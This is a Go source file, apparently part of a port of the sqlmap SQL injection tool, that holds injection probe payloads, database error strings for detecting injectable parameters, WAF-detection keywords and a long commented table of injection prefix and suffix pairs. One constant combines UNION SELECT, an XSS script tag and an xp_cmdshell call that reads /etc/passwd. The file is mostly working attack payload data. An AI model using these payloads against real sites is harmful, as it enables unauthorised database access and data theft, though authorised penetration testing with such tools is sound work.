package gosqlmap

var payloads = []string{
	"'", "')", "';", "\"", "\")", "order by 5 %23--", "\";", "--", "-0", ") AND 1998=1532 AND (5526=5526",
	" AND 5434=5692%23", " %' AND 5268=2356 AND '%'='", " ') AND 6103=4103 AND ('vPKl'='vPKl", " ' AND 7738=8291 AND 'UFqV'='UFqV",
	"`", "`)", "`;", "\\\\", "%27", "%%2727", "%25%27", "%60", "%5C"}

var FORMAT_EXCEPTION_STRINGS = []string{"Type mismatch",
	"Error converting", "Please enter a", "Conversion failed", "String or binary data would be truncated", "Failed to convert",
	"unable to interpret text value", "Input string was not in a correct format", "System.FormatException",
	"java.lang.NumberFormatException", "ValueError: invalid literal", "TypeMismatchException", "CF_SQL_INTEGER",
	"CF_SQL_NUMERIC", " for CFSQLTYPE ", "cfqueryparam cfsqltype", "InvalidParamTypeException", "Invalid parameter type",
	"Attribute validation error for tag", "is not of type numeric", "<cfif Not IsNumeric(", "invalid input syntax for integer",
	"invalid input syntax for type", "invalid number", "character to number conversion error", "unable to interpret text value",
	"String was not recognized as a valid", "Convert.ToInt", "cannot be converted to a ",
	"InvalidDataException", "Arguments are of the wrong type"}

var HEURISTIC_CHECK_ALPHABET = "\"',)(."

// query 请求连接符
var DEFAULT_GET_POST_DELIMITER = '&'

// check waf
var WAF_CHECK_KEYWORD = []string{"造成安全威胁", "Bot-Block-ID", "您访问IP已被管理员限制", "本次事件ID", "当前访问疑似黑客攻击",
	"safedog", "拦截", "ValidateInputIfRequiredByConfig", "You don't have permission to access", "location.href"}

const IPS_WAF_CHECK_PAYLOAD = "1 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\"XSS\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#"

var GENERIC_PROTECTION_KEYWORDS = []string{}

//前缀与后缀
//需要获取5个对象
//RADNSTR # 随机字符串 4字节
//RANDNUM # 随机数字 随便
//RANDSTR1# 随机字符串 4字节后面修改
//RANDSTR2# 同上
//ORIGINAL# 获取url中的传递参数值

//var pre_suf = {
//'pre_suf_1': {'prefix': ')',
//'suffix': '('},
//
//'pre_suf_2': {'prefix': '))',
//'suffix': '(('},
//
//'pre_suf_3': {'prefix': "')",
//'suffix': "('"},
//
//'pre_suf_4': {'prefix': '"',
//'suffix': '"'},
//
//'pre_suf_5': {'prefix': "'",
//'suffix': "'"},
//
//'pre_suf_6': {'prefix': '")',
//'suffix': '("'},
//
//'pre_suf_7': {'prefix': ')"',
//'suffix': '"('},
//
//'pre_suf_8': {'prefix': ")'",
//'suffix': "('"},
//
//'pre_suf_9': {'prefix': ')))',
//'suffix': '((('},
//
//'pre_suf_10': {'prefix': ')',
//'suffix': '%23'},
//
//'pre_suf_11': {'prefix': ')',
//'suffix': '--+'},
//
//'pre_suf_12': {'prefix': "')",
//'suffix': '%23'},
//
//'pre_suf_13': {'prefix': "')",
//'suffix': '--+'},
//
//'pre_suf_14': {'prefix': '"',
//'suffix': '%23'},
//
//'pre_suf_15': {'prefix': '"',
//'suffix': '--+'},
//
//'pre_suf_16': {'prefix': "'",
//'suffix': "--+"},
//
//'pre_suf_17': {'prefix': ')',
//'suffix': ' AND ([RANDNUM]=[RANDNUM]'},
//
//'pre_suf_18': {'prefix': '))',
//'suffix': ' AND (([RANDNUM]=[RANDNUM]'},
//
//'pre_suf_19': {'prefix': ')))',
//'suffix': '( AND ((([RANDNUM]=[RANDNUM]'},
//
//'pre_suf_20': {'prefix': "')",
//'suffix': " AND ('[RANDSTR]'='[RANDSTR]"},
//
//'pre_suf_21': {'prefix': "'))",
//'suffix': " AND (('[RANDSTR]'='[RANDSTR]"},
//
//'pre_suf_22': {'prefix': "')))",
//'suffix': " AND ((('[RANDSTR]'='[RANDSTR]"},
//
//'pre_suf_23': {'prefix': "'",
//'suffix': " AND '[RANDSTR]'='[RANDSTR]"},
//
//'pre_suf_24': {'prefix': "')",
//'suffix': " AND ('[RANDSTR]' LIKE '[RANDSTR]"},
//
//'pre_suf_25': {'prefix': "'))",
//'suffix': " AND (('[RANDSTR]' LIKE '[RANDSTR]"},
//
//'pre_suf_26': {'prefix': "')))",
//'suffix': " AND ((('[RANDSTR]' LIKE '[RANDSTR]"},
//
//'pre_suf_27': {'prefix': '")',
//'suffix': ' AND ("[RANDSTR]"="[RANDSTR]'},
//
//'pre_suf_28': {'prefix': '"))',
//'suffix': ' AND (("[RANDSTR]"="[RANDSTR]'},
//
//'pre_suf_29': {'prefix': '")))',
//'suffix': ' AND ((("[RANDSTR]"="[RANDSTR]'},
//
//'pre_suf_30': {'prefix': '"',
//'suffix': ' AND "[RANDSTR]"="[RANDSTR]'},
//
//'pre_suf_31': {'prefix': '")',
//'suffix': ' AND ("[RANDSTR]" LIKE "[RANDSTR]'},
//
//'pre_suf_32': {'prefix': '"))',
//'suffix': ' AND (("[RANDSTR]" LIKE "[RANDSTR]'},
//
//'pre_suf_33': {'prefix': '")))',
//'suffix': ' AND ((("[RANDSTR]" LIKE "[RANDSTR]'},
//
//'pre_suf_34': {'prefix': '"',
//'suffix': ' AND "[RANDSTR]" LIKE "[RANDSTR]'},
//
//'pre_suf_35': {'prefix': ' ',
//'suffix': '# [RANDSTR]'},
//
//'pre_suf_36': {'prefix': ' ',
//'suffix': '%23'},
//
//'pre_suf_38': {'prefix': "'",
//'suffix': " OR '[RANDSTR1]'='[RANDSTR2]"},
//
//'pre_suf_39': {'prefix': "') WHERE [RANDNUM]=[RANDNUM]",
//'suffix': '%23'},
//
//'pre_suf_40': {'prefix': "') WHERE [RANDNUM]=[RANDNUM]",
//'suffix': '--+'},
//
//'pre_suf_41': {'prefix': '") WHERE [RANDNUM]=[RANDNUM]',
//'suffix': '%23'},
//
//'pre_suf_42': {'prefix': '") WHERE [RANDNUM]=[RANDNUM]',
//'suffix': '--+'},
//
//'pre_suf_43': {'prefix': ') WHERE [RANDNUM]=[RANDNUM]',
//'suffix': '%23'},
//
//'pre_suf_44': {'prefix': ') WHERE [RANDNUM]=[RANDNUM]',
//'suffix': '--+'},
//
//'pre_suf_45': {'prefix': "' WHERE [RANDNUM]=[RANDNUM]",
//'suffix': '%23'},
//
//'pre_suf_46': {'prefix': "' WHERE [RANDNUM]=[RANDNUM]",
//'suffix': '--+'},
//
//'pre_suf_47': {'prefix': '" WHERE [RANDNUM]=[RANDNUM]',
//'suffix': '%23'},
//
//'pre_suf_48': {'prefix': '" WHERE [RANDNUM]=[RANDNUM]',
//'suffix': '--+'},
//
//'pre_suf_49': {'prefix': ' WHERE [RANDNUM]=[RANDNUM]',
//'suffix': '%23'},
//
//'pre_suf_50': {'prefix': ' WHERE [RANDNUM]=[RANDNUM]',
//'suffix': '--+'},
//
//'pre_suf_51': {'prefix': "'||(SELECT '[RANDSTR]' WHERE [RANDNUM]=[RANDNUM]",
//'suffix': "||'"},
//
//'pre_suf_52': {'prefix': "'||(SELECT '[RANDSTR]' FROM DUAL WHERE [RANDNUM]=[RANDNUM]",
//'suffix': "||'"},
//
//'pre_suf_53': {'prefix': "'+(SELECT '[RANDSTR]' WHERE [RANDNUM]=[RANDNUM]",
//'suffix': "+'"},
//
//'pre_suf_54': {'prefix': "||(SELECT '[RANDSTR]' FROM DUAL WHERE [RANDNUM]=[RANDNUM]",
//'suffix': '||'},
//
//'pre_suf_55': {'prefix': "||(SELECT '[RANDSTR]' WHERE [RANDNUM]=[RANDNUM]",
//'suffix': '||'},
//
//'pre_suf_56': {'prefix': '+(SELECT [RANDSTR] WHERE [RANDNUM]=[RANDNUM]',
//'suffix': '+'},
//
//'pre_suf_57': {'prefix': "+(SELECT '[RANDSTR]' WHERE [RANDNUM]=[RANDNUM]",
//'suffix': '+'},
//
//'pre_suf_58': {'prefix': "')) AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]",
//'suffix': '%23'},
//
//'pre_suf_59': {'prefix': "')) AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]",
//'suffix': '--+'},
//
//'pre_suf_60': {'prefix': '")) AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]',
//'suffix': '%23'},
//
//'pre_suf_61': {'prefix': '")) AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]',
//'suffix': '--+'},
//
//'pre_suf_62': {'prefix': ')) AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]',
//'suffix': '%23'},
//
//'pre_suf_63': {'prefix': ')) AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]',
//'suffix': '--+'},
//
//'pre_suf_64': {'prefix': "') AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]",
//'suffix': '%23'},
//
//'pre_suf_65': {'prefix': "') AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]",
//'suffix': '--+'},
//
//'pre_suf_66': {'prefix': '") AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]',
//'suffix': '%23'},
//
//'pre_suf_67': {'prefix': '") AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]',
//'suffix': '--+'},
//
//'pre_suf_68': {'prefix': ') AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]',
//'suffix': '%23'},
//
//'pre_suf_69': {'prefix': ') AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]',
//'suffix': '--+'},
//
//'pre_suf_70': {'prefix': '` WHERE [RANDNUM]=[RANDNUM]',
//'suffix': '--+'},
//
//'pre_suf_71': {'prefix': '` WHERE [RANDNUM]=[RANDNUM]',
//'suffix': '%23'},
//
//'pre_suf_72': {'prefix': '`) WHERE [RANDNUM]=[RANDNUM]',
//'suffix': '%23'},
//
//'pre_suf_73': {'prefix': '`) WHERE [RANDNUM]=[RANDNUM]',
//'suffix': '--+'},
//
//'pre_suf_74': {'prefix': '`=`[ORIGINAL]`',
//'suffix': ' AND `[ORIGINAL]`=`[ORIGINAL]'},
//
//'pre_suf_75': {'prefix': '"="[ORIGINAL]"',
//'suffix': ' AND "[ORIGINAL]"="[ORIGINAL]'},
//
//'pre_suf_76': {'prefix': ']-(SELECT 0 WHERE [RANDNUM]=[RANDNUM]',
//'suffix': ')|[[ORIGINAL]'},
//
//'pre_suf_77': {'prefix': "' IN BOOLEAN MODE)",
//'suffix': '#'}
//}
